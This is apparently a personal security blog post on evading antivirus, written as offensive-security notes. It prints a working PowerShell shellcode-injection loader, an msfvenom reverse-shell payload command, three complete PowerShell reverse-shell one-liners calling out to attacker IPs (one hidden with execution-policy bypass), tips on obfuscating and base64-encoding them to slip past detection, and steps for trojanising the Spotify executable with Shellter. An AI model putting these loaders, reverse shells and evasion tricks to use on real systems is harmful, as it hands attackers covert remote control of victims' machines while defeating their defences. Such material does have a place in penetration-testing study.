---
layout: post
title: Evading AV
titledate: 09/09/23
tags: ["infosec","offsec", "exploit", "evasion", "shell", "powershell", "shellter"]
---

#### Evading Avira

One technique is to use variable obfuscation or randomization

AVs generally match text files pretty closely so we can try to randomize variables when possible

The following is a known powershell memory injection script

```powershell
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

$winFunc = 
  Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;

[Byte[]];
[Byte[]]$sc = <place your shellcode here>;

$size = 0x1000;

if ($sc.Length -gt 0x1000) {$size = $sc.Length};

$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};

$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
```

The script imports VirtualAlloc and CreateThread from kernel32 and then memset from msvcrt

This script allows us to allocate memory and execute code in a newly created thread for the current powershell process

we can use msfvenom to create our shellcode payload

    $ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.1 LPORT=443 -f powershell -v sc

to avoid AV detection we can try to randomize the variable names

#### Further Evading

If this script is still detected we can try to use a powershell one liner reverse shell 

### $ $client = New-Object System.Net.Sockets.TCPClient("192.168.45.154",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

And

    $ powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("192.168.1.1",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

And

    $ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.1.1',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"


And then we can encode it with this script https://github.com/darkoperator/powershell_scripts/blob/master/ps_encoder.py 

This script takes a powershell command and base64 encodes it to be passed as a parameter to powershell

#### Automate Evasions with Shellter

shellter is a shellcode injection tool

we can run the tool in Auto or Manual mode

enable stealth mode to continue normal application execution after the exploit code is triggered

in the following example we inject a payload in the spotify executable

![_config.yml]({{ site.baseurl }}/images/exploitation/shellter.png)

now we can send our payload to our windows system

i do this with by hosting a python upload download server

    $ python3 -m uploadserver

### NOTE: if receiving a connect from the victim server but shell terminates with netcat, setup meterpreter listener or try stageless payload

### TODO: Write script to generate all shellcode option files based off of ip addr and port arguments - arch, format, bad chars, shellcode type etc


